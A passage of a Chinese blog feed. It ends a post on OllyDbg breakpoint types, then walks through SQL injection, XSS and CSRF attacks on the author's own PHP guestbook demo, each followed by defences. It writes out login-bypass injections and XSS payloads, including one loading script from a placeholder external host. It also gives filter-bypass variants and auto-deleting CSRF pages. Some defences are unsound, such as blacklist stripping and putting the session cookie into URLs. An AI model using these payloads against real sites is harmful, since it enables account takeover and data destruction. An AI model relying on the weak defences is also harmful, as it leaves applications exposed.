否则放行。<br><br>内存断点只能设置一次,不能设置多个,而且不会显示地点在哪,调试器不记录,所以要自己及时把内存断点记下来。而且当程序重新载入后也会自动消失</p><p>补充一些相关的东西：</p><ol><li>内存断点很消耗资源，因为<code>PAGE_NOACCESS</code>属性一设置就是一整个内存页无法访问，那么当程序访问该内存页中非断点地址的内容同样会触发异常，这时od收到异常后需要进行特殊处理，临时放行，非常消耗资源，甚至这使得内存断点在调试很多大型程序时慢到近乎不可用。</li><li>虽然内存断点的效率经常很不理想，但是因为仅仅是修改了一个内存属性，所以内存断点可以下数量非常多、单断点范围非常大。这是它的优势。</li><li>只在写入时断下的内存断点通常是将内存属性设为<code>PAGE_EXECUTE_READ</code>，也就是不可写来实现的。对这种属性的内存进行写操作将会触发异常。</li></ol><p><em>新设置的内存断点后 原来的断点会被覆盖 一次只能设置一个</em><br><img src="/2019/05/22/Windows消息机制-消息断点/2-1.png" alt></p><p><strong>常用于观察什么时候把特定资源(特定字符串)写入内存 没事别用 用硬件断点快</strong></p><h2 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h2><blockquote><p>硬件断点是由cpu直接提供支持, cpu为调试器提供专门的8个寄存器用于调试下断点. </p></blockquote><p>原理:</p><ol><li>现代cpu为程序调试提供了<strong>8个寄存器</strong>，名为<code>DRx</code>.</li><li>调试器可以轻易读写被调试程序的这8个寄存器，而被调试程序不容易读写也通常不需要读写。</li><li><code>DR0~DR3</code>四个寄存器用来存放欲下断的地址，<code>DR4,DR5</code>这两个保留, <code>DR6,DR7</code>用来控制断点的大小和触发断点的时机。(<strong>比如说大小一个byte，触发时机为写入时</strong>)</li></ol><p>硬件断点就不需要od做太多事情了，它只需要把用户的需求转换一下格式，写入被调试程序的DRx系列的寄存器中，并等待系统发来的消息就行了。当od收到了消息就暂停目标程序 完成下断.</p><p>硬件断点限制和特点：</p><ol><li>寄存器数量的限制导致硬件断点最多只能同时存在4个，并且od在特定设置或者插件的影响下可能内部还会占用一两个用来辅助程序调试，可用数量十分有限。</li><li>不仅硬件断点数量不多，在32位程序中，每个硬件断点最大范围是4个字节，经常不太够用。</li><li>由于cpu的直接支持，硬件断点的效率是非常高的，给一个程序设置了硬件断点，在不触发的情况下，不会有肉眼可见的效率影响，毕竟只是写了个寄存器而已。</li><li>硬件断点生效时他会先执行符合条件的代码，<strong>执行完后才停下</strong>，而内存断点和CC断点在即将执行符合条件的代码处被断下。</li></ol><p>总结，内存断点通过修改内存页的属性并捕获异常来间接暂停被调试的程序运行，而硬件断点是由cpu直接提供支持。因为这样，所以<strong>内存断点的效率大大低于硬件断点</strong>，但内存断点的自由性大于硬件断点，可以下很多很大不用担心硬件限制。通常在调试程序时，能用硬件断点就别用内存断点 而且内存断点经常下了找不着，而硬件断点od有单独的窗口显示。</p><p>在程序窗口设置方法如下：右击-断点-硬件执行断点<br><img src="/2019/05/22/Windows消息机制-消息断点/3-1.png" alt><br>在数据窗口，同样右击-断点-硬件访问断点-Dword。这里的Dword是指你选中的数据的长度是4字节。当程序访问44B000到44B004这4个字节的内存事会被断下<br><img src="/2019/05/22/Windows消息机制-消息断点/3-2.png" alt></p><p><strong>ESP定律脱壳会用到硬件断点</strong></p><h2 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h2><blockquote><p>达到设置的条件时才触发的断点 例如 eax==0x400</p></blockquote><p>特别牛逼 特别好用 我觉得<br>如何设置条件断点:</p><ol><li>Shift+f2</li><li>右键-断点-条件,再输入条件：例如 eax==4000000.</li></ol><p>满足条件的地方会变粉红色 (感觉可以利用这个写插件啥的)<br><img src="/2019/05/22/Windows消息机制-消息断点/4-1.png" alt><br>执行到该行时，首先判断eax是否等于400000，是则被断下，不是就继续运行。<br>不但如此，条件表达式还能加入逻辑运算符<code>&amp;&amp;</code>与<code>||</code>或<code>!=</code>非构成更复杂的条件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Eax</span>==<span class="number">4000000</span>||ecx==<span class="number">6</span></span><br><span class="line"><span class="attr">Eax</span>==<span class="number">4000000</span>&amp;&amp;ecx==<span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="条件记录断点"><a href="#条件记录断点" class="headerlink" title="条件记录断点"></a>条件记录断点</h2><p>我觉得不算断点 就是上面那张图 条件记录断点=条件断点+记录功能<br><a href="https://bbs.pediy.com/thread-226511.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226511.htm</a></p><h2 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h2><h3 id="Windows消息机制简介"><a href="#Windows消息机制简介" class="headerlink" title="Windows消息机制简介"></a>Windows消息机制简介</h3><p>Windows 系统中有两种消息队列, 一种是<strong>系统消息队列</strong>(一个), 另一种是<strong>应用程序消息队列</strong>(每个应用程序对应一个)。<br>计算机的所有输入设备由 Windows 监控, 当一个事件发生时:</p><ol><li>先将输入的消息放入<strong>系统消息队列</strong>中</li><li>然后再将输入的消息<strong>拷贝</strong>到<strong>相应的应用程序队列</strong>中</li><li>应用程序中的<strong>消息循环</strong>从它的消息队列中检索每一个消息并发送给<strong>相应的窗口函数</strong>中。</li></ol><p><img src="/2019/05/22/Windows消息机制-消息断点/1-1.png" alt></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">窗口: 每个程序都至少有一个主窗口 可以理解成界面, 用户和程序交互的接口</span></span><br><span class="line"><span class="section">句柄: 资源标识号(窗口 图标 画刷 光标等) 可以理解成例如安卓里的按钮对应的编号</span></span><br></pre></td></tr></table></figure><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><blockquote><p>用于捕获某个按钮或控件所产生的<strong>消息</strong> 例如松开按钮产生的消息<code>WM_LBUTTONUP</code></p></blockquote><ol><li>查看-&gt;窗口</li><li>选择相关控件窗口 右键-&gt;在ClassProc上设置消息断点</li><li>设置捕获的消息<code>WM_LBUTTONUP</code></li></ol><p>大概是 给系列控件添加 消息处理函数<code>ClassProc</code> 用于截获<code>WM_LDUPPONUT</code>消息</p><p>在消息机制最后一步 消息循环 并把消息送到对应窗口(控件)函数 前 先送到消息处理函数<code>ClassProc</code> 截获后 再把消息送到对应的自己编写消息处理函数<code>WinProc</code>(例如 收到松开消息后干嘛)</p><p><strong>总的来说 在消息产生后 对应窗口函数接受处理前 截获消息下断, 再往下走一步 就能清楚地跟踪到 消息被送到哪, 后续对消息的处理.</strong></p><p>实践练习博客<a href="https://www.52pojie.cn/thread-1099956-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1099956-1-1.html</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;知识补坑: 消息断点 消息机制 断点类型&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="http://Ronpa.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>PHP开发-安全性分析-加固</title>
    <link href="http://ronpa.top/2019/05/20/PHP%E5%BC%80%E5%8F%91-%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90-%E5%8A%A0%E5%9B%BA/"/>
    <id>http://ronpa.top/2019/05/20/PHP%E5%BC%80%E5%8F%91-%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90-%E5%8A%A0%E5%9B%BA/</id>
    <published>2019-05-20T07:35:48.000Z</published>
    <updated>2021-01-25T19:26:44.273Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>拿之前写的留言板demo来测试<br>sql注入<br>跨站脚本攻击实验(XSS)<br>跨站点请求伪造攻击(CSRF)<br>文件上传漏洞的分析与防护</p></blockquote><a id="more"></a><h1 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1. sql注入"></a>1. sql注入</h1><h2 id="1-1-攻击实现"><a href="#1-1-攻击实现" class="headerlink" title="1.1 攻击实现"></a>1.1 攻击实现</h2><p>原理大概是 输入一些特定语句 导致SQL语句的错误闭合</p><p>例如 登录验证</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//判断密码是否相等</span><br><span class="line">$str="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'$id'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$pwd'</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>使用 <code>Ronpa&#39; or 1=1#</code> 用 <code>&#39;</code> 闭合 前半部分的username的查询 在把后面的密码验证注释掉, 实现任意用户名登录(Ronpa不用填也行)<br><br>如下图 user:Ronpa’ or 1=1#<br><img src="/2019/05/20/PHP开发-安全性分析-加固/sql1.png" alt></p><p>更彻底一点的是在密码框进行注入 实现任意用户登录<br><code>&#39; or 1=1#</code><br><img src="/2019/05/20/PHP开发-安全性分析-加固/sql2.png" alt></p><h2 id="1-2-防护方法"><a href="#1-2-防护方法" class="headerlink" title="1.2 防护方法"></a>1.2 防护方法</h2><ol><li>对输入字符进行限制, 例如过滤掉敏感字符 <code># = &#39;</code>等</li><li>对用户名和密码进一步处理 存在数据库里的和拿来比对的都是经过加密的</li><li>加上转义字符</li></ol><h3 id="1-2-1-敏感字符过滤"><a href="#1-2-1-敏感字符过滤" class="headerlink" title="1.2.1 敏感字符过滤"></a>1.2.1 敏感字符过滤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> dowith_sql(<span class="variable">$str</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="variable">$str</span> = str_replace(<span class="string">"'"</span>,<span class="string">""</span>,<span class="variable">$str</span>);</span><br><span class="line">   <span class="variable">$str</span> = str_replace(<span class="string">""</span><span class="string">","</span><span class="string">",<span class="variable">$str</span>);</span></span><br><span class="line"><span class="string">   <span class="variable">$str</span> = str_replace("</span> <span class="string">","</span><span class="string">",<span class="variable">$str</span>);</span></span><br><span class="line"><span class="string">   <span class="variable">$str</span> = str_replace("</span>or<span class="string">","</span><span class="string">",<span class="variable">$str</span>);</span></span><br><span class="line"><span class="string">   <span class="variable">$str</span> = str_replace("</span>=<span class="string">","</span><span class="string">",<span class="variable">$str</span>);</span></span><br><span class="line"><span class="string">   <span class="variable">$str</span> = str_replace("</span>%20<span class="string">","</span><span class="string">",<span class="variable">$str</span>);</span></span><br><span class="line"><span class="string">   //echo <span class="variable">$str</span>;</span></span><br><span class="line"><span class="string">   return <span class="variable">$str</span>;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-2-加入转义字符"><a href="#1-2-2-加入转义字符" class="headerlink" title="1.2.2 加入转义字符"></a>1.2.2 加入转义字符</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())             <span class="comment">//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="symbol">$</span>id  = addslashes(<span class="symbol">$</span>id);           <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）加上反斜线转义</span></span><br><span class="line">    <span class="symbol">$</span>pwd = addslashes(<span class="symbol">$</span>pwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-跨站脚本攻击-XSS"><a href="#2-跨站脚本攻击-XSS" class="headerlink" title="2. 跨站脚本攻击(XSS)"></a>2. 跨站脚本攻击(XSS)</h1><p>原理大概是 在用户可输入的地方植入HTML语句 执行自己需要的操作<br>这样别的用户打开页面的时候 植入的代码就会执行</p><h2 id="2-1-简单注入javascript-存储型XSS漏洞"><a href="#2-1-简单注入javascript-存储型XSS漏洞" class="headerlink" title="2.1 简单注入javascript 存储型XSS漏洞"></a>2.1 简单注入javascript 存储型XSS漏洞</h2><h3 id="2-1-1-弹出字符串-amp-cookie"><a href="#2-1-1-弹出字符串-amp-cookie" class="headerlink" title="2.1.1 弹出字符串&amp;cookie"></a>2.1.1 弹出字符串&amp;cookie</h3><p>网站的表单域： <code>&lt;input type=&quot;text&quot; name=&quot;author&quot; placeholder=&quot;Your Full Name&quot; /&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"foolish"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   #弹出hack</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/hack/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   #弹出hack '/' 可用来替换单引号</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>      #弹出cookie</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx.com/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  #引用外部的xss</span><br></pre></td></tr></table></figure><p>用户填写数据为：<code>&lt;script&gt;alert(&quot;foolish!&quot;)&lt;/script&gt;</code><br>提交后将会弹出一个foolish警告窗口，接着将数据存入数据库, 等到别的客户端请求这个留言的时候，将数据取出显示留言时将执行攻击代码，将会显示一个foolish警告窗口。<br><img src="/2019/05/20/PHP开发-安全性分析-加固/xss1.png" alt></p><h3 id="2-1-2-页面跳转"><a href="#2-1-2-页面跳转" class="headerlink" title="2.1.2 页面跳转"></a>2.1.2 页面跳转</h3><p>页面跳转</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name=<span class="string">"test"</span>;</span></span><br><span class="line"><span class="javascript">alert(<span class="built_in">document</span>.domain+<span class="string">" "</span>+<span class="built_in">window</span>.name);</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location=<span class="string">"http://www.ronpa.top"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-2-反射型XSS漏洞"><a href="#2-2-反射型XSS漏洞" class="headerlink" title="2.2 反射型XSS漏洞"></a>2.2 反射型XSS漏洞</h2><p>一个页面把用户输入打印到页面上就会出现反射型XSS漏洞<br><img src="/2019/05/20/PHP开发-安全性分析-加固/反射型xss.png" alt></p><p>黑客构造一个链接 通过get方法传入注入代码 再诱使用户点击链接 即可达到漏洞利用</p><p>例如构造 <code>127.0.0.1/show.php?name=&quot;&gt;&lt;script&gt;alert(/简单的XSS/)&lt;/script&gt;&lt;&quot;</code></p><p>最后会闭合成 <code>&lt;input type=&quot;text&quot; value=&quot;111&quot;&gt;&lt;script&gt;alert(/简单的XSS/)&lt;/script&gt;&lt;&quot;&quot;&gt;</code></p><p><img src="/2019/05/20/PHP开发-安全性分析-加固/反射型xss3.png" alt></p><h2 id="2-3-防御"><a href="#2-3-防御" class="headerlink" title="2.3 防御"></a>2.3 防御</h2><h3 id="2-3-1-过滤敏感字符-黑名单"><a href="#2-3-1-过滤敏感字符-黑名单" class="headerlink" title="2.3.1 过滤敏感字符(黑名单)"></a>2.3.1 过滤敏感字符(黑名单)</h3><p>和上面防SQL一样 直接替换敏感字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/******************************/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $str = str_replace(<span class="string">"&lt;/script&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"&lt;script&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"alert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"&lt;body&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"&lt;/body&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   <span class="comment">//echo $str;</span></span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">$author=dowith_sql($author);</span><br><span class="line">$title=dowith_sql($title);</span><br><span class="line">$content=dowith_sql($content);</span><br><span class="line"><span class="comment">/******************************/</span></span><br></pre></td></tr></table></figure><p>如下图 过滤掉了<code>alert &lt;/script&gt; &lt;script&gt;</code><br><img src="/2019/05/20/PHP开发-安全性分析-加固/xss2.png" alt></p><h3 id="2-3-2-过滤敏感字符-绕过方法"><a href="#2-3-2-过滤敏感字符-绕过方法" class="headerlink" title="2.3.2 过滤敏感字符 绕过方法"></a>2.3.2 过滤敏感字符 绕过方法</h3><ol><li>大小写绕过<code>&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</code></li><li>双写 针对只会过滤一次的特性<code>&lt;scr&lt;script&gt;ipt&gt;alalertert(/xss/)&lt;/sc&lt;/script&gt;ript&gt;</code> 过滤掉之后会留下正确的注入语句</li><li>javascript伪协议</li></ol><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href="javascript:alert(<span class="symbol">\x</span>ss<span class="symbol">\)</span>"&gt;2&lt;/a&gt;  //可以去掉双引号</span><br><span class="line">&lt;a href=javascript:eval("<span class="symbol">\\</span>x61<span class="symbol">\\</span>x6c<span class="symbol">\\</span>x65<span class="symbol">\\</span>x72<span class="symbol">\\</span>x74<span class="symbol">\\</span>x28<span class="symbol">\\</span>x27<span class="symbol">\\</span>x78<span class="symbol">\\</span>x73<span class="symbol">\\</span>x73<span class="symbol">\\</span>x27<span class="symbol">\\</span>x29")&gt;2&lt;/a&gt;   //不能去掉双引号</span><br><span class="line">&lt;a href=javascript:eval("&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;")&gt;2&lt;/a&gt;  //可以去掉双引号</span><br><span class="line">直接闭合后'onmouseover='javascript:alert(1321)' 鼠标滑过就触发xss</span><br></pre></td></tr></table></figure><h3 id="2-3-3-Htmlspecialchars"><a href="#2-3-3-Htmlspecialchars" class="headerlink" title="2.3.3 Htmlspecialchars()"></a>2.3.3 Htmlspecialchars()</h3><p>利用自带的过滤函数过滤敏感字符<br>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。<code>&amp;&lt;&gt;&quot;&#39;</code></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name = $_GET[<span class="string">"name"</span>]<span class="comment">;</span></span><br><span class="line">$name = htmlspecialchars($name)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>如下图 无法触发xss漏洞 特殊字符已被<br><img src="/2019/05/20/PHP开发-安全性分析-加固/Htmlspecialchars2.png" alt><br><img src="/2019/05/20/PHP开发-安全性分析-加固/Htmlspecialchars.png" alt></p><h3 id="2-3-3-Htmlspecialchars-绕过方法"><a href="#2-3-3-Htmlspecialchars-绕过方法" class="headerlink" title="2.3.3 Htmlspecialchars()绕过方法"></a>2.3.3 Htmlspecialchars()绕过方法</h3><p><code>htmlspecialchars(string,flags,character-set,double_encode)</code><br>其中第二个参数flags需要重要注意<br>可用的引号类型：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ENT_COMPAT</span> - 默认。仅编码双引号。</span><br><span class="line">ENT_QUOTES - 编码双引号和单引号。</span><br><span class="line">ENT_NOQUOTES - 不编码任何引号。</span><br></pre></td></tr></table></figure><p>默认是只编码双引号<br><code>http://127.0.0.1/show.php?name=111&#39;onmouseover=&#39;javascript:alert(1321)</code> 鼠标滑过触发xss</p><p>所以要添加第二个参数</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="built_in">name</span> = htmlspecialchars($<span class="built_in">name</span>, ENT_QUOTES);</span><br></pre></td></tr></table></figure><h1 id="3-跨站请求伪造CSRF-Cross-Site-Request-Forgeries"><a href="#3-跨站请求伪造CSRF-Cross-Site-Request-Forgeries" class="headerlink" title="3. 跨站请求伪造CSRF(Cross Site Request Forgeries)"></a>3. 跨站请求伪造CSRF(Cross Site Request Forgeries)</h1><h2 id="3-1-攻击实现"><a href="#3-1-攻击实现" class="headerlink" title="3.1 攻击实现"></a>3.1 攻击实现</h2><p>攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。<br>攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达到攻击者的目的。</p><p>简单来说就是 利用用户存在浏览器上的身份验证信息 用用户的权限去做一些攻击者想达成的事</p><h3 id="3-1-2-利用-lt-img-gt-标签"><a href="#3-1-2-利用-lt-img-gt-标签" class="headerlink" title="3.1.2 利用&lt;img&gt;标签"></a>3.1.2 利用<code>&lt;img&gt;</code>标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/del.php?id=58"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>把这个写在csrf.php中 当管理员访问这个页面之后会看到一张加载出错的图片, 然后执行删除命令<br><img src="/2019/05/20/PHP开发-安全性分析-加固/csrf.png" alt><br>写多个图片标签能做到批量利用csrf漏洞删除所有留言的功能<br><img src="/2019/05/20/PHP开发-安全性分析-加固/csrf1.png" alt></p><h3 id="3-1-3-直接递交跳转请求"><a href="#3-1-3-直接递交跳转请求" class="headerlink" title="3.1.3 直接递交跳转请求"></a>3.1.3 直接递交跳转请求</h3><p>但这个太明显 会有弹窗和自动跳转</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/del.php"</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">name</span>=<span class="string">'test'</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span>  <span class="attr">name</span>=<span class="string">'id'</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">        test.id.value=53;</span><br><span class="line">        test.submit();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-防护方法"><a href="#3-2-防护方法" class="headerlink" title="3.2 防护方法"></a>3.2 防护方法</h2><h3 id="3-2-1-验证-HTTP-Referer-字段"><a href="#3-2-1-验证-HTTP-Referer-字段" class="headerlink" title="3.2.1 验证 HTTP Referer 字段"></a>3.2.1 验证 HTTP Referer 字段</h3><p>通过抓包查看请求referer头 能看到来自<code>csrf.php</code> 发起攻击的页面,所有可以根据这个来进行检测<br><img src="/2019/05/20/PHP开发-安全性分析-加固/Referer.png" alt></p><p>所有可以加上请求的头的referer检测, 规定只能从固定界面访问功能 禁止从攻击者搭建的网站执行操作访问目标网站</p><p>在del.php中添加判断referer头代码</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>]== <span class="string">"http://127.0.0.1/show.php"</span>)</span><br></pre></td></tr></table></figure><p>可以防御来自非 show.php界面的删除命令</p><h3 id="3-2-1-验证-HTTP-Referer-字段绕过方法"><a href="#3-2-1-验证-HTTP-Referer-字段绕过方法" class="headerlink" title="3.2.1 验证 HTTP Referer 字段绕过方法"></a>3.2.1 验证 HTTP Referer 字段绕过方法</h3><ol><li>但是攻击者可以把这条语句插入到 show.php 界面里 按照正确的referer发起攻击<br><img src="/2019/05/20/PHP开发-安全性分析-加固/csrf3.png" alt></li><li>攻击者也可以通过别的手段获取cookie值之后 手动修改请求头的 referer子段达成csrf攻击</li><li>验证逻辑有瑕疵 攻击者可以设置页面</li></ol><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span> <span class="keyword">referer</span> = request.headers.<span class="keyword">referer</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">referer</span>.indexOf(<span class="string">'www.bank.example'</span>) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">  <span class="comment">// pass</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果黑客的网站是<a href="http://www.bank.example.hack.com，则referer检查无效" target="_blank" rel="noopener">www.bank.example.hack.com，则referer检查无效</a></p><h3 id="3-2-2-在请求地址中添加-token-并验证"><a href="#3-2-2-在请求地址中添加-token-并验证" class="headerlink" title="3.2.2 在请求地址中添加 token 并验证"></a>3.2.2 在请求地址中添加 token 并验证</h3><p>此防护方法建立在攻击者无法获得admin的cookie值<br>攻击者不能获得第三方的Cookie</p><p>show.php里的get代码</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$check</span>= <span class="variable">$_COOKIE</span>[<span class="string">'PHPSESSID'</span>]<span class="comment">;</span></span><br><span class="line">&lt;a href = <span class="string">'del.php?id=".<span class="variable">$res</span>['</span>id<span class="string">']."&amp;check=".<span class="variable">$check</span>."'</span>&gt;</span><br></pre></td></tr></table></figure><p>del.php的校验代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'check'</span>]== $_COOKIE[<span class="string">'PHPSESSID'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"cookie校验通过"</span>;</span><br><span class="line"><span class="comment">//referer请求头检测;</span></span><br><span 